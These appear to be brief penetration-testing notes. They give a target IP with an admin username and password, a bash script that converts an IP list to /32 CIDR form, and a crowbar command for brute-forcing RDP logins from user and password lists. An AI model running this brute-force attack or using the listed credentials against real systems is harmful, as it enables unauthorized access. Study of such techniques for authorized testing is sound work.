---
IP_TARGET: 172.16.75.14
PASSWD: DonovanJadeKnight1
USER: admin
PASS:
---
- Create list of target IP address (targets.txt)
- Use below script (convert_to_cidr.sh) to convert to CIDR notation:
	```
	#!/bin/bash
	
	# Input and output files
	input_file="targets.txt"
	output_file="targets_CIDR.txt"
	
	# Ensure the input file exists
	if [[ ! -f "$input_file" ]]; then
	    echo "Error: $input_file not found!"
	    exit 1
	fi
	
	# Process each line, append /32, and save to the new file
	awk '{print $0 "/32"}' "$input_file" > "$output_file"
	
	echo "Conversion complete. CIDR-formatted IPs saved in $output_file"
	```
- crowbar -b rdp -S targets_CIDR.txt -U users.txt -C passwords.txt -n 1